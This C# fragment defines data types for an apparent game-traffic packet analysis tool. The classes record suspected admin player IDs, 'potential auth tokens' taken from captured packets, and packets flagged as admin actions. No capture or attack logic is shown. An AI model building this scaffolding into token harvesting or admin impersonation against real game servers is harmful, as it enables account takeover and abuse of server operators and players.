// ── Supporting types ──────────────────────────────────────────────────────────

/// <summary>A player ID candidate identified from packet traffic.</summary>
public class AdminCandidate
{
    public uint    PlayerId { get; set; }
    public int     Seen     { get; set; }
    public string? Name     { get; set; }
    public int     Score    { get; set; }
}

/// <summary>A high-entropy byte run extracted from a captured packet - potential auth token.</summary>
public sealed class TokenEntry
{
    public byte             Opcode    { get; set; }
    public PacketDirection  Direction { get; set; }
    public int              Offset    { get; set; }
    public byte[]           TokenBytes { get; set; } = Array.Empty<byte>();
    public byte[]           FullPacket { get; set; } = Array.Empty<byte>();
    public DateTime         At        { get; set; }
}

/// <summary>A captured packet flagged as a potential admin action.</summary>
public sealed class AdminActionEntry
{
    public byte             Opcode    { get; set; }
    public PacketDirection  Direction { get; set; }
    public byte[]           Data      { get; set; } = Array.Empty<byte>();
    public string           Reason    { get; set; } = "";
    public DateTime         At        { get; set; }
}
